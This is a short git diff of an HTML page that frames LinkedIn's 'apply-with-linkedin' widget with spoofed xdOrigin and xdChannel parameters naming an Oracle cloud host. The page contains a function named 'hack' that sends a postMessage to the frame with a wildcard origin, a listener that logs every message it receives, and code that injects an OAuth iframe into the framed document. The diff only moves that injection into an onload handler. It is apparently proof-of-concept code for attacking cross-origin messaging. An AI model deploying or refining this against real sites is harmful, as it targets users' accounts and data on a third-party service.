@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
 	<script>
-		const mainFrame = document.getElementById("i");
+		
 		function hack(){
 			const mainFrame = document.getElementById("i");
 			setTimeout(function(){mainFrame.contentWindow.postMessage('The_message','*');},2000);
@@ -14,7 +14,8 @@
 		window.addEventListener("message", function(event) {
 		    console.log(event.data)
 		});
-		mainFrame.onload = () => {
+		function addFrame() {
+			const mainFrame = document.getElementById("i");
 		    const outerIframeDocument = mainFrame.contentDocument || mainFrame.contentWindow.document;
 		    const oauthIframe = document.createElement('iframe');
 		    oauthIframe.style.width = '50vw'
@@ -25,6 +26,6 @@
 	</script>
 </head>
 <body>
-    <iframe id="i" src="https://www.linkedin.com/talentwidgets/apply-with-linkedin#xdOrigin=https%3A%2F%2Ffa-exjq-saasfaprod1.fa.ocs.oraclecloud.com&xdChannel=79a1d95b-b365-4857-8774-37ea53c84651" ></iframe>
+    <iframe id="i" src="https://www.linkedin.com/talentwidgets/apply-with-linkedin#xdOrigin=https%3A%2F%2Ffa-exjq-saasfaprod1.fa.ocs.oraclecloud.com&xdChannel=79a1d95b-b365-4857-8774-37ea53c84651" onload='addFrame()'></iframe>
 </body>
 </html>
